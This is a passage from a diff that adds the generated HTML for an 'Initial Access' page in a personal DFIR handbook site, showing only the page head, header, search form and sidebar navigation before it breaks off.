@@ -1,0 +1,5272 @@
+<!DOCTYPE html><html lang="en" class="no-js"><head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Personal digital forensics &amp; incident response reference">
+      
+      
+        <meta name="author" content="Comwhiz">
+      
+      
+        <link rel="canonical" href="https://DFIDwiz-sketch.github.io/dfir-handbook/redteam/initial-access/">
+      
+      
+        <link rel="prev" href="../">
+      
+      
+        <link rel="next" href="../../threat-intel/">
+      
+      
+        
+          <link rel="alternate" href="/dfir-handbook/" hreflang="en">
+        
+          <link rel="alternate" href="/dfir-handbook/ko/" hreflang="ko">
+        
+      
+      
+      <link rel="icon" href="../../assets/favicon.svg">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.7">
+    
+    
+      
+        <title>Initial Access - DFIR Handbook</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.ec1eaa64.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&amp;display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/extra.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  <link href="../../assets/stylesheets/glightbox.min.css" rel="stylesheet"><script src="../../assets/javascripts/glightbox.min.js"></script><style id="glightbox-style">
+            html.glightbox-open { overflow: initial; height: 100%; }
+            .gslide-title { margin-top: 0px; user-select: text; }
+            .gslide-desc { color: #666; user-select: text; }
+            .gslide-image img { background: white; }
+            .gscrollbar-fixer { padding-right: 15px; }
+            .gdesc-inner { font-size: 0.75rem; }
+            body[data-md-color-scheme="slate"] .gdesc-inner { background: var(--md-default-bg-color); }
+            body[data-md-color-scheme="slate"] .gslide-title { color: var(--md-default-fg-color); }
+            body[data-md-color-scheme="slate"] .gslide-desc { color: var(--md-default-fg-color); }
+        </style></head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#initial-access-master-reference" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="DFIR Handbook" class="md-header__button md-logo" aria-label="DFIR Handbook" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 9a3 3 0 0 1 3 3 3 3 0 0 1-3 3 3 3 0 0 1-3-3 3 3 0 0 1 3-3m5.86 10.31C16.23 21.22 14.28 22.45 12 23c-2.56-.61-4.7-2.07-6.42-4.37C3.86 16.34 3 13.8 3 11V5l9-4 9 4v6c0 2.39-.64 4.61-1.92 6.67l-2.91-2.91c.52-.79.83-1.76.83-2.76a5 5 0 0 0-5-5 5 5 0 0 0-5 5 5 5 0 0 0 5 5c1 0 1.97-.31 2.76-.83z"></path></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"></path></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            DFIR Handbook
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Initial Access
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo" aria-label="Switch to light mode" type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden="">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m14.3 16-.7-2h-3.2l-.7 2H7.8L11 7h2l3.2 9zM20 8.69V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12zm-9.15 3.96h2.3L12 9z"></path></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo" aria-label="Switch to dark mode" type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden="">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"></path></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo" aria-label="Switch to system preference" type="radio" name="__palette" id="__palette_2">
+    
+      <label class="md-header__button md-icon" title="Switch to system preference" for="__palette_0" hidden="">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"></path></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+      <div class="md-header__option">
+  <div class="md-select">
+    
+    <button class="md-header__button md-icon" aria-label="Select language">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m12.87 15.07-2.54-2.51.03-.03A17.5 17.5 0 0 0 14.07 6H17V4h-7V2H8v2H1v2h11.17C11.5 7.92 10.44 9.75 9 11.35 8.07 10.32 7.3 9.19 6.69 8h-2c.73 1.63 1.73 3.17 2.98 4.56l-5.09 5.02L4 19l5-5 3.11 3.11zM18.5 10h-2L12 22h2l1.12-3h4.75L21 22h2zm-2.62 7 1.62-4.33L19.12 17z"></path></svg>
+    </button>
+    <div class="md-select__inner">
+      <ul class="md-select__list">
+        
+          <li class="md-select__item">
+            <a href="/dfir-handbook/" hreflang="en" class="md-select__link">
+              English
+            </a>
+          </li>
+        
+          <li class="md-select__item">
+            <a href="/dfir-handbook/ko/" hreflang="ko" class="md-select__link">
+              한국어
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</div>
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required="">
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"></path></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard="" data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"></path></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix="">
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/DFIDwiz-sketch/dfir-handbook" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"></path></svg>
+  </div>
+  <div class="md-source__repository">
+    dfir-handbook
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../basics/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Basics
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../windows/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Windows
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../linux/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Linux
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../network/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Network
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../memory/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Memory
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../splunk/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Splunk
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../adversary/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Adversary
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../pentesting/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Pentesting
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Red Team
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../threat-intel/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Threat Intel
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../tools/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Tools
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../playbooks/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Playbooks
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../learning/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Learning
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../tags/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Tags
+
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="DFIR Handbook" class="md-nav__button md-logo" aria-label="DFIR Handbook" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 9a3 3 0 0 1 3 3 3 3 0 0 1-3 3 3 3 0 0 1-3-3 3 3 0 0 1 3-3m5.86 10.31C16.23 21.22 14.28 22.45 12 23c-2.56-.61-4.7-2.07-6.42-4.37C3.86 16.34 3 13.8 3 11V5l9-4 9 4v6c0 2.39-.64 4.61-1.92 6.67l-2.91-2.91c.52-.79.83-1.76.83-2.76a5 5 0 0 0-5-5 5 5 0 0 0-5 5 5 5 0 0 0 5 5c1 0 1.97-.31 2.76-.83z"></path></svg>
+
+    </a>
+    DFIR Handbook
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/DFIDwiz-sketch/dfir-handbook" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"></path></svg>
+  </div>
+  <div class="md-source__repository">
+    dfir-handbook
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix="">
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2">
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../basics/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Basics
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2" id="__nav_2_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Basics
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix="">
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../basics/http-status-codes/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    HTTP Status Codes
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../basics/linux-commands/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Essential Linux Commands
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../basics/well-known-ports/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Well-Known Ports
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../basics/windows-event-ids/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Windows Event IDs
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3">
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../windows/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Windows
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3" id="__nav_3_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Windows
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix="">
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../windows/artefact-identification/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Identifying Artefacts by Scenario
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../windows/prefetch/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Prefetch
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../windows/amcache/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Amcache
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../windows/shimcache/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Shimcache (AppCompatCache)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../windows/registry-keys/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Registry Keys for DFIR
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../windows/lnk-jumplists/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    LNK Files &amp; Jump Lists
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../windows/mft-usn/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    $MFT, $UsnJrnl &amp; $LogFile
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../windows/srum/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SRUM
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../windows/event-logs/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Windows Event Logs (EVTX)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4">
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../linux/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Linux
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_4" id="__nav_4_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Linux
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix="">
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../linux/auth-and-history/" class="md-nav__link">
+        
+  
+  
